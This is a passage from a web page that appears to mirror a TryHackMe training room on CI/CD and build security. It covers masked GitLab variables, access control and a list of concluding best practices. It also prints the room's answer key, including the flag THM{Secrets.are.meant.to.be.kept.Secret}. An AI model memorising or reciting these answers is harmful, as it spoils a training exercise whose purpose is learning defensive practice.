<li class="">Once you&#x27;ve added a secure variable, you can use it in your .gitlab-ci.yml file without worrying about it being exposed in logs.</li>
</ul>
<p>Note: Ensure that your job scripts do not inadvertently echo or print sensitive information, even when using masked variables. Double-check your scripts to avoid unintentional exposure of secrets.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="access-control">Access Control<a href="#access-control" class="hash-link" aria-label="Direct link to Access Control" title="Direct link to Access Control" translate="no">​</a></h4>
<p>Limit access to CI/CD variables and logs. Only authorized can view job logs and variables in GitLab. You can configure project-level and group-level access controls to achieve this.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Is using environment variables enough to protect the build secrets? (yay or nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the value of the PROD API_KEY? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Secrets.are.meant.to.be.kept.Secret}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-11-conclusion">Task 11 Conclusion<a href="#task-11-conclusion" class="hash-link" aria-label="Direct link to Task 11 Conclusion" title="Direct link to Task 11 Conclusion" translate="no">​</a></h2>
<p>Based on the attacks and misconfigurations we saw in the previous tasks, we can understand that:</p>
<ol>
<li class="">Pipeline Security is a Priority: Ensuring the security of your CI/CD pipeline is crucial for safeguarding code and data integrity.</li>
<li class="">Access Controls are Fundamental: Restricting access to critical branches, environments, and CI/CD variables is the first line of defence against unauthorised changes and data exposure.</li>
<li class="">Runner Security is Essential: Properly securing the machines running your GitLab Runner, along with strong authentication, is a must to prevent breaches.</li>
<li class="">Secrets Management Matters: Safeguarding sensitive data, such as API keys and passwords, through GitLab CI/CD variables with masking and secure variables is vital. Using environment variables is not enough.</li>
<li class="">Isolate Environments: Separating development (DEV) and production (PROD) environments minimises the risk of compromising the latter through the former.</li>
<li class="">Continuous Vigilance: Regularly reviewing access permissions, scripts, and security configurations, combined with monitoring and alerting, ensures ongoing security.</li>
<li class="">Education is Key: Educating your team about security best practices is essential to maintaining a robust security posture.</li>
</ol>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> I understand CI/CD and Build Security! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Networks/cicdandbuildsecurity/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/en/docs/Networks/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Networks</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/en/docs/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">index</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1-introduction" class="table-of-contents__link toc-highlight">Task 1 Introduction</a><ul><li><a href="#pre-requisites" class="table-of-contents__link toc-highlight">Pre-Requisites</a></li><li><a href="#learning-objectives" class="table-of-contents__link toc-highlight">Learning Objectives</a></li></ul></li><li><a href="#task-2-setting-up" class="table-of-contents__link toc-highlight">Task 2 Setting up</a><ul><li><a href="#patching-in" class="table-of-contents__link toc-highlight">Patching In</a></li><li><a href="#attackbox" class="table-of-contents__link toc-highlight">AttackBox</a></li><li><a href="#other-hosts" class="table-of-contents__link toc-highlight">Other Hosts</a></li><li><a href="#configuring-dns" class="table-of-contents__link toc-highlight">Configuring DNS</a></li><li><a href="#contacting-mu-th-ur-6000" class="table-of-contents__link toc-highlight">Contacting MU-TH-UR 6000</a></li></ul></li><li><a href="#task-3-what-is-cicd-and-build-security" class="table-of-contents__link toc-highlight">Task 3 What is CI/CD and Build Security?</a><ul><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#fundamentals-of-cicd" class="table-of-contents__link toc-highlight">Fundamentals of CI/CD</a></li><li><a href="#a-typical-cicd-pipeline" class="table-of-contents__link toc-highlight">A Typical CI/CD Pipeline</a></li><li><a href="#solarwinds-case" class="table-of-contents__link toc-highlight">SolarWinds Case</a></li></ul></li><li><a href="#task-4-creating-your-own-pipeline" class="table-of-contents__link toc-highlight">Task 4 Creating your own Pipeline</a><ul><li><a href="#introduction-1" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#gitlab-registration" class="table-of-contents__link toc-highlight">Gitlab Registration</a></li><li><a href="#project-creation" class="table-of-contents__link toc-highlight">Project Creation</a></li><li><a href="#understanding-cicd-configuration" class="table-of-contents__link toc-highlight">Understanding CI/CD Configuration</a></li><li><a href="#runner-registration" class="table-of-contents__link toc-highlight">Runner Registration</a></li><li><a href="#build-automation" class="table-of-contents__link toc-highlight">Build Automation</a></li></ul></li><li><a href="#task-5-securing-the-build-source" class="table-of-contents__link toc-highlight">Task 5 Securing the Build Source</a><ul><li><a href="#source-code-security" class="table-of-contents__link toc-highlight">Source Code Security</a></li><li><a href="#confusion-of-responsibilities" class="table-of-contents__link toc-highlight">Confusion of responsibilities</a></li><li><a href="#exploiting-a-vulnerable-build-source" class="table-of-contents__link toc-highlight">Exploiting a vulnerable build source</a></li><li><a href="#securing-the-build-source" class="table-of-contents__link toc-highlight">Securing the Build Source</a></li></ul></li><li><a href="#task-6-securing-the-build-process" class="table-of-contents__link toc-highlight">Task 6 Securing the Build Process</a><ul><li><a href="#managing-dependencies" class="table-of-contents__link toc-highlight">Managing Dependencies</a></li><li><a href="#knowing-when-to-start-the-build" class="table-of-contents__link toc-highlight">Knowing When to Start the Build</a></li><li><a href="#exploiting-a-merge-build" class="table-of-contents__link toc-highlight">Exploiting a Merge Build</a></li></ul></li><li><a href="#task-7-securing-the-build-server" class="table-of-contents__link toc-highlight">Task 7 Securing the Build Server</a><ul><li><a href="#build-server-basics" class="table-of-contents__link toc-highlight">Build Server Basics</a></li><li><a href="#exposed-build-server" class="table-of-contents__link toc-highlight">Exposed Build Server</a></li><li><a href="#protecting-the-build-server" class="table-of-contents__link toc-highlight">Protecting the Build Server</a></li></ul></li><li><a href="#task-8-securing-the-build-pipeline" class="table-of-contents__link toc-highlight">Task 8 Securing the Build Pipeline</a><ul><li><a href="#access-gates" class="table-of-contents__link toc-highlight">Access Gates</a></li><li><a href="#the-two-person-concept" class="table-of-contents__link toc-highlight">The Two-Person Concept</a></li><li><a href="#exploiting-misconfigured-access-gates" class="table-of-contents__link toc-highlight">Exploiting Misconfigured Access Gates</a></li><li><a href="#protecting-the-pipeline" class="table-of-contents__link toc-highlight">Protecting the Pipeline</a></li></ul></li><li><a href="#task-9-securing-the-build-environment" class="table-of-contents__link toc-highlight">Task 9 Securing the Build Environment</a><ul><li><a href="#environment-segregation" class="table-of-contents__link toc-highlight">Environment Segregation</a></li><li><a href="#one-build-agent-to-rule-them-all" class="table-of-contents__link toc-highlight">One Build Agent to Rule Them All</a></li><li><a href="#protecting-the-build-environment" class="table-of-contents__link toc-highlight">Protecting the Build Environment</a></li></ul></li><li><a href="#task-10-securing-the-build-secrets" class="table-of-contents__link toc-highlight">Task 10 Securing the Build Secrets</a><ul><li><a href="#one-secret-to-rule-them-all" class="table-of-contents__link toc-highlight">One Secret to Rule Them All</a></li><li><a href="#protecting-the-build-secrets" class="table-of-contents__link toc-highlight">Protecting the Build Secrets</a></li></ul></li><li><a href="#task-11-conclusion" class="table-of-contents__link toc-highlight">Task 11 Conclusion</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/en/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/TryHackMyOffsecBox" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - TryHackMyOffsecBox<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/CRONUS-Security" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - CRONUS-Security<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>